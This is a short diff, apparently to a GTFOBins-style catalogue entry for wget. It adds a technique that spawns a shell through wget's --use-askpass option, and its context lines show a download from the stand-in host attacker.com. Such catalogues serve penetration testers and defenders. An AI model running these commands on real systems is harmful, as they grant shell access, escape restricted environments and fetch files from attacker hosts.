@@ -24,6 +24,12 @@ functions:
         URL=http://attacker.com/file_to_get
         LFILE=file_to_save
         wget $URL -O $LFILE
+  shell:
+    - code: |
+        TF=$(mktemp)
+        echo -e '#!/bin/sh\nsh 1>&0 2>&0' > $TF
+        chmod +x $TF
+        wget -v --use-askpass=$TF 0
   suid:
     - description: Fetch a remote file via HTTP GET request.
       code: |
